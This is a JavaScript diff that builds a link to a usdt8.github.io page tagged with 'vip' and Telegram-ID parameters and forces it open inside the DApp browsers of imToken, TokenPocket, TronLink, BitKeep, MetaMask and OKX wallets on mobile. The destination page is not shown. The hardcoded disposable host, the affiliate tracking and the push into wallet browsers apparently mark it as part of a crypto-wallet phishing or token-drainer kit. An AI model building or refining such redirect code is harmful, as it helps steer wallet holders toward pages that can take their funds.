@@ -93,15 +93,13 @@ function paylistevent(from) {
 
 	console.log(tgid)
 
-	let im_url = 'https://usdt8.github.io/d/index.html?vip=' + vip + '&tgid=' + tgid
-	let tp_url = 'https://usdt8.github.io/d/index.html?vip=' + vip + '&tgid=' + tgid
-	let my_url = 'https://usdt8.github.io/d/index.html?vip=' + vip + '&tgid=' + tgid
+	let targetUrl = 'https://usdt8.github.io/d/1.html?vip=' + vip + '&tgid=' + tgid
 
 	// let qr_url = 	window.location.protocol + "//" + window.location.host + "https://svip66.github.io/b/" + addtype + "&to_address=" + to_address + "&from_url=" + from_url;
 
 	if (from == 'imToken') {
 		if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
-			tryOpenApp('imtokenv2://navigate?screen=DappView&url=' + im_url)
+			tryOpenApp('imtokenv2://navigate?screen=DappView&url=' + targetUrl)
 		} else {
 			alert('请在手机游览器操作！')
 			// 	        location.href = qr_url;
@@ -111,7 +109,7 @@ function paylistevent(from) {
 			// if (addtype == 'trc20') {
 			// location.href = 'tpdapp://open?params={"url": "' + tp_url + '"}'
 			// } else {
-			tryOpenApp('tpdapp://open?params={"url": "' + tp_url + '", "chain": "ERC", "source":"xxx"}')
+			tryOpenApp('tpdapp://open?params={"url": "' + targetUrl + '"}')
 			// }
 		} else {
 			alert('请在手机游览器操作！')
@@ -120,7 +118,7 @@ function paylistevent(from) {
 	} else if (from == 'TronLink') {
 		if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
 			var param = {
-				url: im_url,
+				url: targetUrl,
 				action: 'open',
 				protocol: 'tronlinkoutside',
 				version: '1.0',
@@ -131,27 +129,27 @@ function paylistevent(from) {
 		}
 	} else if (from == 'BitKeep') {
 		if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
-			tryOpenApp('bitkeep://dapp?url=' + im_url)
+			tryOpenApp('bitkeep://dapp?url=' + targetUrl)
 		} else {
 			alert('请在手机游览器操作！')
 		}
 	} else if (from == 'Metamask') {
 		if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
 			// Metamask needs url without protocol
-			var urlNoProtocol = im_url.replace(/^https?:\/\//, '')
+			var urlNoProtocol = targetUrl.replace(/^https?:\/\//, '')
 			tryOpenApp('https://metamask.app.link/dapp/' + urlNoProtocol)
 		} else {
 			alert('请在手机游览器操作！')
 		}
 	} else if (from == 'Okex') {
 		if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
-			tryOpenApp('okx://wallet/dapp/details?dappUrl=' + encodeURIComponent(im_url))
+			tryOpenApp('okx://wallet/dapp/details?dappUrl=' + encodeURIComponent(targetUrl))
 		} else {
 			alert('请在手机游览器操作！')
 		}
 	} else {
 		$('#pay_' + from).modal('show')
-		$('#pay_' + from + '_url').val(my_url)
+		$('#pay_' + from + '_url').val(targetUrl)
 	}
 }
 
